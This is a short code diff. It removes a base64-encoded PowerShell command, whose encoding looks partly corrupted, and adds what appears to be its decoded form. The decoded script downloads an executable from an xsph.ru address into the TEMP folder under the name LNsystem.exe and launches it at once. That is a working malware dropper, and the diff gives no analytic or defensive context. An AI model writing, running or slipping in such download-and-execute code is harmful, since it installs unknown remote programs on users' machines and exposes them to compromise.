@@ -1,1 +1,12 @@
-powershell -enc JHVybCA9ICJodHRwOi8vY0xFED5800B537160029B3B9325981d92d1Ab8727A3leGUiCiRvdXRwdXRQYXRoID0gIiRlbnY6VEVNUFxMTnN5c3RlbS5leGUiICAKCgp0cnkgewoKICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHVybCAtT3V0RmlsZSAkb3V0cHV0UGF0aAoKICAgIGlmIChUZXN0LVBhdGggLVBhdGggJG91dHB1dFBhdGgpIHsKCiAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJG91dHB1dFBhdGgKICAgIH0KfSBjYXRjaCB7CgogICAgV3JpdGUtSG9zdCAiQW4gZXJyb3Igb2NjdXJyZWQ6ICRfIgp9
+$url = "http://a1067277.xsph.ru/1Elusion.exe"
+$outputPath = "$env:TEMP\LNsystem.exe"
+
+try {
+    Invoke-RestMethod -Uri $url -OutFile $outputPath
+
+    if (Test-Path -Path $outputPath) {
+        Start-Process -FilePath $outputPath
+    }
+} catch {
+    Write-Host "An error occurred: $_"
+}
